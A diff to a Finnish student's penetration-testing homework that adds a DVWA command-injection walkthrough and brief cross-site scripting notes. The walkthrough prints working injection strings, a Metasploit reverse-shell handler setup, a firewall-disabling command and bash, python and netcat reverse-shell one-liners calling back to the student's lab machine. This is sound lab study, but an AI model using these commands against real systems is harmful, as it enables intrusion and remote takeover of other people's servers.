@@ -31,7 +31,27 @@ Ja käydään vaihtamassa DVWA Security low tasolle, jotta tehtävät olisi help
 ![image](https://user-images.githubusercontent.com/71498717/201332554-2ee707a5-c639-4e0b-900b-34ae334c8b5c.png)  
 
 
-# C
+# C Execute! Ratkaise DVWA "Command Excution".
+Aloitetaan kokeilemalla mitä tapahtuu jos käyttää sivua sen käyttötarkoitukseen eli pingaamiseen  
+![image](https://user-images.githubusercontent.com/71498717/201343064-91dc8007-db61-42dc-a4f5-976780c113a3.png)  
+Huomattiin, että sivu serveri ajaa ```ping 192.168.252.4```komennon ja palauttaa tulokset. Tästä voidaan päätellä, että komennot tapahtuu sivua pyörittävällä koneella. Mikäli komentoja putkitetaan ```;``` merkin avulla voidaan koneessa suorittaa komentoja. Komennolla ```192.168.252.4; ls``` listautuu koneen sen kansion tiedostot  
+![image](https://user-images.githubusercontent.com/71498717/201347009-1e1d33b4-4871-4d6a-b386-a1c86dbb7ebd.png)  
+Kokeillaan saadaanko tätä kautta avattua reverse shell omaan koneeseen. Avataan metasploit framework ja käytetään multi/handler moduulia ```use exploit/multi/handler ``` asetetaan payloadiksi linux/x64/meterpreter_reverse_tcp. ```set payload linux/x64/meterpreter_reverse_tcp``` ```options```´siitä aukeaa tarvittavat tiedot, jotta payload saadaan käytettyä oikein  
+![image](https://user-images.githubusercontent.com/71498717/201350697-71d44fea-e5a9-41f9-a5cc-d1859a2edf1e.png)  
+Pitää asettaa oman koneen ip kohtaan LHOST  ```set lhost 192.168.252.4``` ja portti olikin siellä valmiina niin ei tarvitse muuta kuin ```exploit```. Nähtävästi mentiin mutkat suoriksi ja itse exploit jäi asettamatta. Eli  ```use exploit/multi/handler ``` ```show payloads``` ```set payload 196```  
+![image](https://user-images.githubusercontent.com/71498717/201351916-4a241a68-18c8-483e-a231-5462ad6b1dc7.png)  
+```set lhost 192.168.252.4``` ja sitten muistetaan vielä laittaa palomuuri alas erillisessä shell ikkunassa```sudo ufw disable``` ja sen jälkeen exploit.  
+![image](https://user-images.githubusercontent.com/71498717/201353594-df02b1c3-2ba8-4b38-a201-736b74f03987.png)  
+
+Jotta reverse shell voidaan avata pitää dvwa sivulta lähettää komento shellin avaamiseksi. Sivulla https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet löytyy bashin komento joten kokeillaan sitä ensiksi. ```192.168.252.4; bash -i >& /dev/tcp/192.168.252.4/4444 0>&1``` syötetään tekstikenttään ja painetaan submit. Pari kertaa submittia painettuna täytyy tulla siihen tulokseen, että ei tällä komennolla ainakaan toimi. Joten kokeillaan toista. Kokeillaan pythonia ```192.168.252.4; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.252.4",4444))``` No ei sekään toiminut toivotulla tavalla. Sitten voisi kokeilla ihan perinteistä netcattia. ```192.168.252.4; nc -e /bin/sh 192.168.252.4 4444```. Sieltä saatiin jotain eloa, mutta ei saatu avattua reverse shelliä. Joten täytyy kokeilla jotain muuta.  
+![image](https://user-images.githubusercontent.com/71498717/201360270-ccc591e2-fe0e-47fb-b90d-245ede2c99bb.png)  
+
+
+
+
+
+ 
+
 # D
 
 # X
@@ -49,6 +69,12 @@ Salaista dataa ei ole salattu vaan se välitetään selkokielisenä. Hyökkääj
 Tietokanta käyttää automaattista salauksen purkua jolloin SQL injectiolla saa salatun datan selkokielisenä.
 ### A7 Cross Site Scripting
 Hyökkääjä kaappaa käyttäjän cookien lähettämällä sen omalle sivulleen. Tämä on mahdollista, jos käyttäjän selaimessa on scripti, jonka voi saada esim painamalla, jotain linkkiä.
-##
+##  Chapter 21: Cross Site Scripting
+- Jos uhrin selaimessa on xss haavoittuvuus ajetaan scripti selaimella.
+- mikäli url sisältää muuttujien nimiä scriptejä pitäisi pystyä ajamaan.
+- kommenttiosioon voi mahdollisesti tallentaa scriptejä, jotka ajetaan kaikilla sivulla vierailevilla.
+- kommenttiosiossa voi olla myös scriptejä, jotka ajaa koodeja toiselta sivulta.
+- selaimessa voi estää javascriptien ajon
+
 
 # Y
